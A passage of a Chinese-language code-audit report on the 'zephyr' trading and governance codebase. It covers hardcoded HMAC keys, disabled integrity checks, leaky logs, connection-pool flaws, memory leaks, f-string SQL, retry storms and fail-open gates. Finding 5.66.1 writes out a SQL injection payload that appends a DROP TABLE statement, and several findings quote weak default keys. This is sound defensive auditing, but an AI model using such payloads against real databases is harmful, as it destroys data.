- **证据**：`def _resolve_hmac_key(config=None): return b"default-key"` — 审计追踪链的HMAC-SHA256签名密钥解析函数返回硬编码弱密钥。任何知道此字符串的攻击者可伪造审计条目，破坏审计链不可否认性。
- **修复**：从环境变量或SecretProvider注入密钥，禁止硬编码。

#### 5.62.2 [HIGH] IntegrityVerifier全部调用点未传入hmac_key——HMAC验证全局失效

- **文件**：`src/zephyr/governance/audit_trail/integrity.py:102-105,134,175`；调用点：`audit_trail/cli.py:97`、`ops/scheduler.py:272`、`phase_check_registry.py:399,531`、`rollback/phase_check_registry.py:401,532`、`audit_orchestrator/cli.py:97`、`ops_governance/phase_check_registry.py:468,613`
- **证据**：`IntegrityVerifier.__init__` 的 `hmac_key` 参数默认 `""`（L102），空时 `self._hmac_key = b""`（L105）。验证逻辑用 `if self._hmac_key:` 门控（L134/L175），空密钥时整个HMAC校验被跳过。**全部9处调用点均构造 `IntegrityVerifier()` 不传hmac_key**，系统级审计链的HMAC篡改检测在所有验证路径上均处于禁用状态。
- **修复**：所有调用点传入从SecretProvider获取的密钥。

#### 5.62.3 [MEDIUM] 回滚完整性HMAC密钥硬编码

- **文件**：`src/zephyr/governance/sqlite_dumper.py:66,107`；副本 `infrastructure/rollback/sqlite_dumper.py:66,107`
- **证据**：`HMAC_KEY_DEFAULT = b"ZephyrAlpha-Rollback-Integrity-v1"`（L66），L107 `self._hmac_key = hmac_key or HMAC_KEY_DEFAULT`。回滚转储的完整性签名使用源码内硬编码密钥，无环境变量注入，无密钥版本标识。轮换密钥后历史转储的HMAC验证全部失败（无key-id路由）。
- **修复**：从环境变量注入密钥，增加key-id版本路由。

#### 5.62.4 [HIGH] L4 Agent身份防伪HMAC密钥硬编码默认值

- **文件**：`src/zephyr/security/llm_defense/llm_security/layers/l4_agent.py:134`
- **证据**：`self._hmac_key = hmac_key or "l4-agent-default-hmac-key"` — L4安全层用于检测agent身份冒充的HMAC不可伪造标记使用硬编码默认密钥。若调用方未传hmac_key，则所有agent身份签名使用公开可知的默认密钥，冒充检测形同虚设。
- **修复**：强制要求传入密钥，无密钥时fail-fast而非使用默认值。

#### 5.62.5 [HIGH] CredentialRotationTrigger仅检测不轮换——无实际轮换机制

- **文件**：`src/zephyr/governance/credential_rotation_trigger.py:63-94,96-103`
- **证据**：类名为"CredentialRotationTrigger"，但 `scan_and_rotate`（L63）仅用正则扫描敏感文件中的凭据模式，`credentials_rotated` 硬编码为 `0`（L90）——从不执行任何轮换操作。整个系统不存在自动化密钥/凭据轮换机制：HMAC密钥均为静态硬编码，无轮换计划、无密钥版本管理、无key-id路由表。
- **修复**：实现真正的轮换机制或重命名类为CredentialRotationDetector。

#### 5.62.6 [MEDIUM] LLM网关裸os.getenv读取API密钥——绕过SecretProvider

- **文件**：`src/zephyr/integration/llm_gateway.py:190,262`；规范声明于 `shared/security/secrets.py:38`
- **证据**：secrets.py L38明确规定"任何API key/token/password MUST通过SecretProvider读取"。但llm_gateway.py L190 `api_key = os.getenv(config.api_key_env, "")` 和L262同模式，直接用 `os.getenv` 读取API密钥，绕过 `EnvSecretProvider` 的审计日志与脱敏机制。
- **修复**：统一通过SecretProvider读取所有密钥。

#### 5.62.7 [LOW] 无密钥派生函数——HMAC密钥为原始静态字符串

- **文件**：全上述B-1/B-3/B-4硬编码密钥
- **证据**：全代码库未发现PBKDF2/scrypt/HKDF/argon2等密钥派生函数使用。HMAC密钥均为原始字符串字面量，未从主密钥派生子密钥，无per-context密钥隔离。
- **修复**：引入HKDF从主密钥派生per-context子密钥。

#### 5.62 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 4 | 5.62.1/5.62.2/5.62.4/5.62.5 |
| MEDIUM | 2 | 5.62.3/5.62.6 |
| LOW | 1 | 5.62.7 |
| **合计** | **7** | |

---

### 5.63 日志中PII/敏感数据泄露（3个，第15轮新增）

#### 5.63.1 [LOW] EmergencyOverride撤销时记录token标识符

- **文件**：`src/zephyr/security/access_control/emergency_override.py:153`
- **证据**：`logger.info("EmergencyOverride: token '%s' revoked", token_id)` — token_id为UUID hex，非令牌密文本身，泄露风险有限。但紧急覆盖令牌标识符在info级别持久化到日志，若日志被聚合到外部系统，token_id可被关联追踪。
- **修复**：降为debug或脱敏为 `tok_***1234`。

#### 5.63.2 [MEDIUM] DLQ存储error_traceback可能含敏感局部变量

- **文件**：`src/zephyr/integration/shared/events/dlq.py:68-71,189-197`
- **证据**：死信队列表含 `error_message TEXT` 和 `error_traceback TEXT` 列。L197 `str(error)`、L196 `type(error).__name__` 连同完整traceback写入DB。若异常源自含密钥的上下文（如PG连接错误含DSN、或LLM调用异常含请求头），traceback中的局部变量字符串化后可能泄露凭据。L124还会将payload广播给观察者，无脱敏过滤。
- **修复**：对traceback进行脱敏处理后再存储。

#### 5.63.3 [MEDIUM] PG连接失败异常可能泄露连接参数

- **文件**：`src/zephyr/governance/auto_runner.py:204,256,281`；`depgraph_schema.py:1106`
- **证据**：`logger.warning("_write_audit_log: PG 连接失败: %s", e)` 等处将psycopg2异常对象字符串化写入日志。`_build_pg_dsn`将 `password=config["POSTGRES_PASSWORD"]` 放入连接kwargs。psycopg2较新版本会遮蔽密码，但旧版本或特定错误路径可能将含密码的连接字符串暴露在异常消息中。
- **修复**：显式过滤异常消息中的密码字段后再记录。

#### 5.63 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| MEDIUM | 2 | 5.63.2/5.63.3 |
| LOW | 1 | 5.63.1 |
| **合计** | **3** | |

---

### 5.64 连接池管理（5个，第15轮新增）

#### 5.64.1 [HIGH] PostgreSQL无连接池——每次调用新建TCP连接

- **文件**：`src/zephyr/governance/depgraph_schema.py:1196`；`auto_runner.py:202,254,279`；`depgraph_schema.py:1215,1231`
- **证据**：`get_depgraph_pg_connection`（L1196）每次调用 `psycopg2.connect(**...)` 新建连接，无 `psycopg2.pool.SimpleConnectionPool`/`ThreadedConnectionPool`。`auto_runner.py`的 `_write_audit_log`/`get_gates_by_event`/`get_all_event_types` 每次调用都connect+close。高频调用下TCP握手+PG认证开销显著，且无连接数上限，可耗尽PG `max_connections`。
- **修复**：引入psycopg2连接池。

#### 5.64.2 [HIGH] 单一PG连接跨线程共享——非线程安全

- **文件**：`src/zephyr/governance/database_service.py:68,87-90`；`depgraph_reader.py:77,79-82`
- **证据**：`DatabaseService`将PG连接缓存为实例属性 `self._depgraph_conn`（L68），`get_depgraph_conn`（L87-90）惰性创建后所有调用复用同一连接。`DepgraphReader`同样缓存单一连接。psycopg2连接对象非线程安全，多线程并发使用同一连接上的cursor会导致协议流损坏、结果错乱。无任何同步机制保护PG连接访问。
- **修复**：使用线程安全连接池或per-thread连接。

#### 5.64.3 [MEDIUM] SQLite连接池无连接健康回收——pool_recycle缺失

- **文件**：`src/zephyr/governance/database_manager.py:169,218-243`
- **证据**：`_conn_pool`为简单list，`return_connection`（L218）仅在归还时做 `SELECT 1` 健康检查，但无 `pool_recycle` 机制——连接即使空闲数小时也不会被回收重建。`connection_leak_detector`（L703）仅检查 `_last_used_at` 属性，但 `get_db_connection`/`get_connection` 从未设置该属性，泄漏检测器实际永远返回空列表——检测功能失效。
- **修复**：添加pool_recycle机制，在get_connection时设置_last_used_at。

#### 5.64.4 [MEDIUM] 连接池耗尽时无限创建临时连接——无上限保护

- **文件**：`src/zephyr/governance/database_manager.py:211-216`
- **证据**：`get_connection`当 `_conn_pool` 为空时（L213）直接 `conn = get_db_connection(...)` 创建临时连接（L214），无 `max_overflow` 上限。注释说"不超过pool_size"但代码未实现该约束。若多个线程同时遇到池空，会并发创建大量连接，违反"单Writer"设计假设，导致SQLite `database is locked` 错误。
- **修复**：实现max_overflow上限，池满时阻塞等待或抛异常。

#### 5.64.5 [LOW] DatabaseService三引擎连接无统一生命周期管理——close_all无异常隔离

- **文件**：`src/zephyr/governance/database_service.py:144-156`
- **证据**：`close_all`（L144）顺序关闭governance/depgraph/market三个连接，任一 `close()` 抛异常则后续连接不关闭（无独立try/except）。例如L147 `_governance_conn.close()` 抛异常，则 `_depgraph_conn`（L150）和 `_market_conn`（L154）泄漏。
- **修复**：每步独立try/except。

#### 5.64 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 2 | 5.64.1/5.64.2 |
| MEDIUM | 2 | 5.64.3/5.64.4 |
| LOW | 1 | 5.64.5 |
| **合计** | **5** | |

---

### 5.65 内存管理与泄漏模式（11个，第15轮新增）

#### 5.65.1 [HIGH] ResourceAwarePool Future列表无界增长

- **文件**：`src/zephyr/governance/audit_trail/resource_aware_pool.py:46-47,56-58`
- **证据**：`submit()` 每次append Future到 `_cpu_futures`/`_gpu_futures`，但任何地方都不删除已完成项。`stats()`（L74-77）遍历整个列表，随时间O(n)变慢且内存线性增长。
- **修复**：定期清理已完成Future，或使用weakref。

#### 5.65.2 [MEDIUM] CostTracker _records列表无界增长（视图截断非存储截断）

- **文件**：`src/zephyr/integration/cost_tracker.py:62,82,120,139`
- **证据**：`record_call()` 每次append（L82），`save_state()` 只取 `[-100:]` 导出（L139），但内存中 `_records` 列表本身永不收缩。`summary()`（L120）全表扫描 `by_model`，随记录数线性变慢。
- **修复**：使用deque(maxlen=N)或在append时裁剪。

#### 5.65.3 [HIGH] WorkOrchestrator _items字典无界增长（complete不删除）

- **文件**：`src/zephyr/trading/work_orchestrator.py:88,157-177`
- **证据**：`submit()` 往 `_items` 写入（L88），`complete_item()` 只改状态为COMPLETED/FAILED（L162），从不 `del`。`schedule_next()`（L126）与 `pending_count()`（L186）每次全表遍历，长跑进程内存与CPU双重劣化。
- **修复**：complete后延迟删除或使用TTL淘汰。

#### 5.65.4 [MEDIUM] MemoryLock _locks字典永不回收

- **文件**：`src/zephyr/shared/infra/lock.py:107-108,117-118,142-153`
- **证据**：`acquire()` 为每个新 `lock_name` 创建 `asyncio.Lock` 存入 `_locks`（L118），但 `release()` 只删 `_owners`（L151），从不删 `_locks`。每个唯一锁名留下一个永久 `asyncio.Lock` 对象。
- **修复**：release时若_owners为空则删除_locks中的条目。

#### 5.65.5 [MEDIUM] TimeoutGuard _handlers字典泄漏

- **文件**：`src/zephyr/governance/timeout_guard.py:55,69,76-94`
- **证据**：`watch()` 往 `_handlers` 写入回调（L69），但 `unwatch()` 只pop `_timers` 和 `_active_scopes`（L78/L82），从不清理 `_handlers`。`_events` 列表（L57）也只在手动 `clear()` 时清空。
- **修复**：unwatch时同时清理_handlers。

#### 5.65.6 [MEDIUM] DriftStateMachine _events字典无界增长

- **文件**：`src/zephyr/behavioral_audit/state_machine.py:65,109,213`
- **证据**：`_events` dict以 `uuid.UUID` 为键，`transition()` 只写入/更新（L109），全文件无 `clear`/`evict`/`del`。终态事件（VERIFIED/FALSE_POSITIVE）也永久驻留。
- **修复**：终态事件定期归档并从内存删除。

#### 5.65.7 [LOW] HandoffManager _records列表无界增长

- **文件**：`src/zephyr/behavioral_audit/handoff_manager.py:355,359`
- **证据**：`create_handoff()` append（L359），`get_pending()` 只过滤不删除（L362），无任何清理方法。
- **修复**：使用deque(maxlen=N)或定期归档。

#### 5.65.8 [LOW] FixReportHistory _history列表无界增长

- **文件**：`src/zephyr/infrastructure/auto_fix_engine/fix_report.py:56,117`
- **证据**：`record()` append（L56），`get_history()` 只取 `[-limit:]` 视图（L117），存储本身不收缩。
- **修复**：使用deque(maxlen=N)。

#### 5.65.9 [MEDIUM] StatePropagator _events列表无界增长

- **文件**：`src/zephyr/trading/orchestrator/state_propagation.py:87,111,115,118`
- **证据**：`notify()` append（L111），`get_events()`/`get_events_for_task()` 只读不删，无 `clear`/`evict` 方法。
- **修复**：添加maxsize限制或定期清理。

#### 5.65.10 [LOW] BlueprintSearchServer _cache过期项不驱逐

- **文件**：`src/zephyr/integration/mcp/blueprint_search_server.py:228,160-165`
- **证据**：读路径有TTL判断（L161），但过期项仅返回miss，不从dict删除；只有手动 `_refresh_index()` 才 `clear()`。不同 `cache_key` 持续累积。
- **修复**：读路径发现过期时删除条目，或使用TTLCache。

#### 5.65.11 [LOW] BackpressureManager _history仅手动clear

- **文件**：`src/zephyr/integration/backpressure_manager.py:83,96,128,162,219-225`
- **证据**：三处 `handle_*` 均append到 `_history`，`get_stats()` 返回 `len(self._history)`。只有显式 `clear()` 才清空，无maxsize/自动淘汰。`_on_pause_handlers`等回调列表也只append不去重不移除。
- **修复**：添加maxsize限制或按时间窗口裁剪。

#### 5.65 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 2 | 5.65.1/5.65.3 |
| MEDIUM | 5 | 5.65.2/5.65.4/5.65.5/5.65.6/5.65.9 |
| LOW | 4 | 5.65.7/5.65.8/5.65.10/5.65.11 |
| **合计** | **11** | |

---

### 5.66 模板注入与字符串格式化安全（6个，第15轮新增）

#### 5.66.1 [HIGH] DatabaseService用f-string拼接INSERT列名（SQL注入）

- **文件**：`src/zephyr/governance/database_service.py:170-172,313-315`
- **证据**：`create_task`/`create_order` 直接将 `task_data.keys()` 拼入SQL列名位置。值用 `?` 参数化，但列名未校验。若调用方传入含注入载荷的键（如 `status) VALUES (1); DROP TABLE tasks; --`），即可注入。
- **修复**：列名白名单校验，或使用ORM。

#### 5.66.2 [MEDIUM] capacity_assurance schema用f-string插入cutoff值（非参数化）

- **文件**：`src/zephyr/infrastructure/capacity_assurance/schema.py:264-265,276-281`
- **证据**：`cutoff = f"datetime('now', '-{self.TTL_DAYS} days')"` 直接拼入SELECT/DELETE。虽 `TTL_DAYS` 是int类属性（当前安全），但模式违背"值必参数化"原则。`PRAGMA table_info({table})`（L236）表名亦未校验。
- **修复**：参数化或白名单校验表名。

#### 5.66.3 [MEDIUM] registry_adapter表名f-string拼接（两处副本）

- **文件**：`src/zephyr/governance/registry_adapter.py:510`；副本 `infrastructure/asset_inventory/registry_adapter.py:508`
- **证据**：`self._table` 来自构造参数，直接拼入 `SELECT * FROM {self._table}`，无白名单校验。若 `_table` 来自配置文件或外部输入可被注入。
- **修复**：表名白名单校验。

#### 5.66.4 [MEDIUM] sqlite_dumper表名f-string拼接（PRAGMA/SELECT/DELETE）

- **文件**：`src/zephyr/governance/sqlite_dumper.py:117,132,312`；副本 `infrastructure/rollback/sqlite_dumper.py:117,132,312`
- **证据**：三处用 `f"... {table}"` 或 `f"... '{table}'"`，`table` 来自参数。单引号包裹（L117/L132）不构成有效防御（表名含 `'` 可逃逸）。L312的 `DELETE FROM '{table}'` 尤其危险。
- **修复**：表名白名单校验，禁止字符串拼接。

#### 5.66.5 [MEDIUM] rollback_verifier表名f-string拼接（两处副本）

- **文件**：`src/zephyr/governance/rollback_verifier.py:196-197`；副本 `infrastructure/rollback/rollback_verifier.py:196-197`
- **证据**：`f"SELECT COUNT(*) as cnt FROM {table}"` 表名无引号无校验。
- **修复**：表名白名单校验。

#### 5.66.6 [MEDIUM] database_manager/f5_shutdown_manager表名f-string拼接

- **文件**：`src/zephyr/governance/database_manager.py:605`；`src/zephyr/governance/f5_shutdown_manager.py:355,435`
- **证据**：`database_manager` 用 `f"SELECT COUNT(*) FROM [{t['name']}]"`（方括号仅SQL Server语法，SQLite下无效防御）；`f5_shutdown_manager` 用 `f"DELETE FROM {self.STATE_TABLE}"` 与 `f"SELECT key, value FROM {self.STATE_TABLE}"`，表名为类属性但未做白名单。
- **修复**：表名白名单校验。

#### 5.66 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 1 | 5.66.1 |
| MEDIUM | 5 | 5.66.2/5.66.3/5.66.4/5.66.5/5.66.6 |
| **合计** | **6** | |

---

### 5.67 线程/进程池大小与背压（3个，第15轮新增）

#### 5.67.1 [HIGH] ResourceAwarePool无背压+私有属性访问

- **文件**：`src/zephyr/governance/audit_trail/resource_aware_pool.py:42-83`
- **证据**：(1) `submit()` 无队列长度检查，ThreadPoolExecutor默认无界队列，任务无限堆积（OOM风险）；(2) `stats()` 访问私有 `_work_queue.qsize()`（L75/L77），CPython实现细节，其他实现/版本会 `AttributeError`；(3) Future列表泄漏（见5.65.1）。
- **修复**：添加maxsize队列限制，提交前检查队列长度。

#### 5.67.2 [HIGH] GPUConsensusScheduler max_workers未使用+队列死代码+批量无限制

- **文件**：`src/zephyr/trading/gpu_consensus_scheduler.py:166,174,194-219,221-223`
- **证据**：(1) `max_workers: int = 1` 参数（L166）存入 `self._max_workers`（L175）但全文件从未使用——无ThreadPoolExecutor、无Semaphore限制并发；(2) `_PriorityQueue`（L117-153，含max_size=50背压）是死代码：`submit()`（L194）直接 `_execute_route`，从不入队；(3) `submit_batch`（L221）对整个requests列表 `asyncio.gather(*tasks)`，无并发上限。
- **修复**：使用max_workers创建Semaphore限流，激活优先级队列。

#### 5.67.3 [HIGH] AsyncRuntime.run_in_executor在运行循环中.result()死锁/崩溃

- **文件**：`src/zephyr/trading/runtime/async_runtime.py:194-206`
- **证据**：当存在运行中的事件循环时（L195成功获取），调用 `loop.run_in_executor` 返回asyncio.Future，随后 `asyncio.ensure_future(future).result()`（L206）。对未完成的asyncio.Future调用 `.result()` 会抛 `InvalidStateError`；即便不抛，同步 `.result()` 阻塞事件循环线程，executor回调无法执行→死锁。文档声称"让同步代码在async环境中调用"，实则不可用。
- **修复**：使用 `asyncio.run_coroutine_threadsafe` 或重构为async调用。

#### 5.67 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 3 | 5.67.1/5.67.2/5.67.3 |
| **合计** | **3** | |

---

### 5.68 异步取消与超时语义（4个，第15轮新增）

#### 5.68.1 [HIGH] drift_engine超时后子进程未kill（孤儿进程）

- **文件**：`src/zephyr/behavioral_audit/drift_engine.py:402-435`
- **证据**：`asyncio.wait_for(proc.communicate(), timeout=...)` 超时后（L410），`TimeoutError` 被捕获（L427）仅返回事件，但 `proc`（asyncio子进程）从未 `kill()`/`terminate()`。`wait_for` 取消的是 `communicate()` 协程，子进程本身继续运行成为孤儿，持续占用资源。
- **修复**：except块中 `proc.kill(); await proc.wait()`。

#### 5.68.2 [HIGH] drift_detection/drift_engine同款子进程孤儿（副本）

- **文件**：`src/zephyr/governance/drift_detection/drift_engine.py:299-317`
- **证据**：与5.68.1完全相同的模式。`proc.communicate()` 超时后（L302）捕获 `TimeoutError`（L313）返回事件，`proc` 未kill。两处为同一缺陷的双副本。
- **修复**：同5.68.1。

#### 5.68.3 [MEDIUM] verdict_engine.evaluate_batch无并发限制

- **文件**：`src/zephyr/trading/verdict_engine.py:325-355`；副本 `governance/behavioral_admission/verdict_engine.py:325-355`
- **证据**：对整个events列表创建 `_eval_one` 协程后 `asyncio.gather(*tasks)`（L353-354），无Semaphore限流。虽每个 `_eval_one` 有 `wait_for` 超时（L334），但大批量事件会瞬时创建海量协程，可能耗尽内存或后端连接。`evaluate` 内部可能调用LLM/外部服务，无背压。
- **修复**：添加 `asyncio.Semaphore` 限制并发数。

#### 5.68.4 [MEDIUM] MemoryLock超时取消后锁状态不一致风险

- **文件**：`src/zephyr/shared/infra/lock.py:120-134`
- **证据**：`wait_timeout_seconds > 0` 时用 `asyncio.wait_for(self._locks[lock_name].acquire(), timeout=...)`（L128）。超时后 `acquire()` 被取消返回 None（L134），但 `_locks` 字典在取消路径上不清理（见5.65.4），取消的锁名永久驻留。且 `release()` 不校验owner一致性——任何持有handle的代码都能释放，无fence token防误释放。
- **修复**：取消路径清理_locks，release校验owner。

#### 5.68 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 2 | 5.68.1/5.68.2 |
| MEDIUM | 2 | 5.68.3/5.68.4 |
| **合计** | **4** | |

---

### 5.69 部分失败处理（5个，第15轮新增）

#### 5.69.1 [HIGH] 治理gate执行异常被静默视为"通过"（fail-open反模式）

- **文件**：`src/zephyr/governance/auto_runner.py:149-159`
- **证据**：`_execute_gate` 的 `except Exception: return True` — 当gate抛出任何异常（不存在、运行时错误、依赖缺失）时，返回True视为通过。这导致 `_run_gates` 中 `passed_gates += 1`，`failed_gates` 保持为0，最终 `result.success` 返回True。治理门禁完全失效且无任何告警。这是fail-open反模式在安全治理链路中的最严重体现。
- **修复**：gate异常时返回False或重新抛出。

#### 5.69.2 [MEDIUM] TaskQueue dispatch handler静默吞掉所有异常无日志

- **文件**：`src/zephyr/trading/auto_runtime_core.py:267-281`
- **证据**：`except Exception: pass` 完全无日志记录。任务分发失败（DB不可用、PipelineOrchestrator初始化失败、dispatch异常）时，调用者只收到 `False`，无法区分"任务不存在"和"分发过程崩溃"。失败任务既不记录也不进入DLQ，直接丢失。
- **修复**：添加日志记录，失败任务进入DLQ。

#### 5.69.3 [MEDIUM] WorkOrchestrator.load_dags静默跳过加载失败的DAG

- **文件**：`src/zephyr/trading/work_orchestrator.py:68-80`
- **证据**：`except Exception: continue` 无日志、无失败计数。调用者只得到成功加载的DAG数量，无法知道哪些DAG文件解析失败、失败原因是什么。批量加载中部分失败的信息完全丢失。
- **修复**：记录失败DAG路径和异常信息，返回失败计数。

#### 5.69.4 [MEDIUM] boot_sequence步骤失败后继续执行后续依赖步骤（无fail-fast）

- **文件**：`src/zephyr/trading/lifecycle_manager.py:103-110`
- **证据**：当 `01_config_validate` 失败时，`02_stop_gate_init`、`04_registry_load` 等后续步骤仍在可能无效的配置状态下执行。步骤间存在隐含依赖（如health_monitor依赖registry），但失败不阻断后续步骤。与5.26.1/5.26.8不同——此处聚焦于"部分步骤失败后继续执行依赖步骤"的部分失败处理缺陷。
- **修复**：失败步骤后break，不执行后续依赖步骤。

#### 5.69.5 [MEDIUM] AlertLinkIsolator后台runner静默吞掉告警发送异常

- **文件**：`src/zephyr/infrastructure/capacity_assurance/risk_mitigation.py:112-117`
- **证据**：`except Exception: pass` 无日志记录。告警发送函数执行失败时无追踪，结合该模块"fire-and-forget"设计，失败告警永久丢失。运维人员无法得知告警链路中断。
- **修复**：添加日志记录失败告警。

#### 5.69 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 1 | 5.69.1 |
| MEDIUM | 4 | 5.69.2/5.69.3/5.69.4/5.69.5 |
| **合计** | **5** | |

---

### 5.70 优雅降级与回退模式（4个，第15轮新增）

#### 5.70.1 [MEDIUM] ResourceOptimizationEngine启动失败被静默吞掉（无降级标记）

- **文件**：`src/zephyr/trading/auto_runtime_core.py:139-145`
- **证据**：`except Exception: pass` 完全无日志。ResourceOptimizationEngine启动失败时，系统继续运行但资源压力监控、自愈、降级矩阵全部失效，且无任何告警或降级标记。与 `memory_writer.py` 的显式降级（返回 `status="degraded"`）形成对比——此处是静默降级。
- **修复**：添加日志和降级标记。

#### 5.70.2 [LOW] EscalationProtocol初始化失败仅debug级日志

- **文件**：`src/zephyr/trading/auto_runtime_core.py:232-247`
- **证据**：升级协议冷启动失败和EventBus订阅失败仅 `logger.debug`，生产环境默认日志级别（INFO/WARNING）下不可见。升级协议在未就绪状态下继续运行，但运维无感知。
- **修复**：提升为warning级别。

#### 5.70.3 [LOW] SpecEngine._discover模块名解析失败静默pass

- **文件**：`src/zephyr/autonomy_core/engine.py:198-206`
- **证据**：路径解析失败后 `module_name` 保持空字符串，后续 `_generate`、`_register` 流程继续执行，可能生成空名称的skill。无降级标记，无警告日志。
- **修复**：解析失败时记录warning并跳过。

#### 5.70.4 [MEDIUM] 多处except Exception: return False/None静默降级（无显式降级标记）

- **文件**：`integration/pipeline_lock.py:255-256,276-277`；`integration/local_model/ollama_chat.py:283-284`；`integration/local_model/ollama_embedding.py:72-73,126-127`；`behavioral_audit/tamper_proof_audit.py:136-137`；`behavioral_audit/self_check.py:94-95`
- **证据**：这些模式无日志记录，调用者无法区分"真阴性"和"异常降级"。特别是 `tamper_proof_audit.verify_chain` 返回False在安全场景下可能掩盖真正的篡改检测失败。与5.52不同——此处聚焦于"返回布尔值且无日志"的普遍模式。
- **修复**：异常路径添加日志，区分"真阴性"和"异常降级"。

#### 5.70 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| MEDIUM | 2 | 5.70.1/5.70.4 |
| LOW | 2 | 5.70.2/5.70.3 |
| **合计** | **4** | |

---

### 5.71 启动验证与Fail-Fast（4个，第15轮新增）

#### 5.71.1 [HIGH] boot()缺少关键配置完整性验证（API keys、DB URLs、模型端点）

- **文件**：`src/zephyr/trading/auto_runtime_core.py:118-157`；`src/zephyr/trading/runtime_config.py:21-32`
- **证据**：`ensure_runtime_dirs` 仅创建目录，无任何配置值验证。`boot()` 直接调用 `boot_sequence`，无pre-boot配置验证。不验证：DeepSeek API key是否非空、Ollama base URL是否可达、PG/SQLite连接是否可用、审计日志目录是否可写。缺少关键配置时系统不fail-fast，而是启动后在运行时才发现，导致部分组件启动、部分失败的混乱状态。与5.26.1不同——此处聚焦于"启动前缺少配置完整性验证"。
- **修复**：boot()前增加 `validate_config()` 验证关键配置。

#### 5.71.2 [MEDIUM] IntegrationRegistry.validate_all()仅验证import可达性，不验证运行时可用性

- **文件**：`src/zephyr/trading/integration_registry.py:59-76`
- **证据**：`__import__(mod_path)` 只验证模块可导入，不验证实际连接（DB连接、API可达性、服务健康）。模块可导入但服务不可用时仍标记为CONNECTED，给出虚假的启动信心。
- **修复**：增加运行时连接探测。

#### 5.71.3 [MEDIUM] boot_sequence中integration_validate失败不阻断后续步骤

- **文件**：`src/zephyr/trading/lifecycle_manager.py:95,103-110`
- **证据**：`validate_all()` 返回的 `ValidationReport`（含connected/degraded/disconnected计数）未被检查。即使所有集成点DISCONNECTED，boot仍继续，`report.success` 仍为True。集成验证沦为形式，不满足fail-fast语义。
- **修复**：检查ValidationReport，disconnected超过阈值时fail-fast。

#### 5.71.4 [LOW] coldstart_manager.initialize()失败不阻断且不检查ready状态

- **文件**：`src/zephyr/trading/auto_runtime_core.py:232-240`
- **证据**：`cm.initialize()` 后不检查 `cm.ready`，即使冷启动未就绪，升级协议仍被视为已初始化。启动顺序验证缺失。
- **修复**：检查cm.ready，未就绪时记录warning。

#### 5.71 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 1 | 5.71.1 |
| MEDIUM | 2 | 5.71.2/5.71.3 |
| LOW | 1 | 5.71.4 |
| **合计** | **4** | |

---

### 5.72 重试风暴预防（6个，第15轮新增）

#### 5.72.1 [HIGH] DeepSeekChat._ask_with_retry无backoff无jitter（立即重试）

- **文件**：`src/zephyr/integration/local_model/deepseek_chat.py:213-241`
- **证据**：重试循环中无任何 `time.sleep()`，失败后立即重试。当DeepSeek API限流或临时不可用时，立即重试会加剧负载，多客户端并发时产生请求风暴。无circuit breaker保护。
- **修复**：添加指数退避+jitter。

#### 5.72.2 [HIGH] OllamaChat._ask_with_retry无backoff无jitter且不捕获异常

- **文件**：`src/zephyr/integration/local_model/ollama_chat.py:348-366`
- **证据**：双重缺陷：(1) 无 `try/except`，`self.ask()` 抛异常时重试逻辑完全不生效，直接传播；(2) 空响应重试无 `time.sleep()`，立即重试。重试机制形同虚设且无退避。
- **修复**：添加try/except + 指数退避。

#### 5.72.3 [MEDIUM] DeepSeekV4Chat._ask_with_retry固定延迟无exponential backoff无jitter

- **文件**：`src/zephyr/intelligence/model_profiling/deepseek_v4_chat.py:514-556`；副本 `pipeline_routing/deepseek_v4_chat.py:376-417`
- **证据**：使用固定 `_time.sleep(1.0)`（空响应）和 `_time.sleep(2.0)`（异常），无指数退避，无jitter。多实例并发重试时会产生同步重试（惊群效应），无法分散负载。两个文件存在相同缺陷（代码重复且缺陷复制）。
- **修复**：改为指数退避+jitter。

#### 5.72.4 [MEDIUM] ResourceOptimizationEngine._self_heal_cycle重试无backoff

- **文件**：`src/zephyr/trading/resource_optimization.py:814-845`
- **证据**：自愈循环失败后 `retries += 1` 立即重试（失败路径无 `time.sleep()`）。在资源压力场景下，立即重试 `optimize()` 可能加剧资源争用，形成"压力→自愈→重试→更大压力"的恶性循环。仅有总超时限制，无退避。
- **修复**：失败路径添加退避延迟。

#### 5.72.5 [LOW] DeadlockDetector.retry_with_backoff有backoff但无jitter

- **文件**：`src/zephyr/infrastructure/capacity_assurance/risk_mitigation.py:76-86`
- **证据**：有指数退避（`base_delay * 2**attempt`）但无jitter。多线程并发重试同一资源时，所有线程在同一时间点重试，产生同步重试峰值。应添加 `+ random.uniform(0, delay * 0.1)` 类型的抖动。
- **修复**：添加jitter。

#### 5.72.6 [LOW] pipeline_orchestrator重试有backoff但无jitter

- **文件**：`src/zephyr/integration/pipeline_orchestrator.py:1203-1246`
- **证据**：有指数退避（`min(2**attempt, 30)`）和上限，且有circuit breaker保护，但无jitter。多任务并发重试同一模型端点时可能产生惊群效应。这是所有重试实现中最完善的一个，但仍缺少jitter。
- **修复**：添加jitter。

#### 5.72 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 2 | 5.72.1/5.72.2 |
| MEDIUM | 2 | 5.72.3/5.72.4 |
| LOW | 2 | 5.72.5/5.72.6 |
| **合计** | **6** | |

---

### 5.73 上下文管理器正确性（4个，第16轮新增）

#### 5.73.1 [MEDIUM] _RealSpanBridge.__exit__丢弃底层上下文返回值，破坏异常抑制契约

- **文件**：`src/zephyr/infrastructure/system_telemetry/facade.py:279-281`
- **证据**：`__exit__` 调用底层 `self._ctx.__exit__(*args)` 但未 `return` 其返回值。若底层上下文管理器返回True以抑制异常，该语义被丢失（本方法恒返回None）。若底层 `__exit__` 自身抛异常，会掩盖with块内的原始异常。
- **修复**：`return self._ctx.__exit__(*args)`。

#### 5.73.2 [MEDIUM] CapacityMetricsBuffer.__exit__调用flush()可掩盖with块原始异常

- **文件**：`src/zephyr/infrastructure/capacity_assurance/schema.py:350-351`
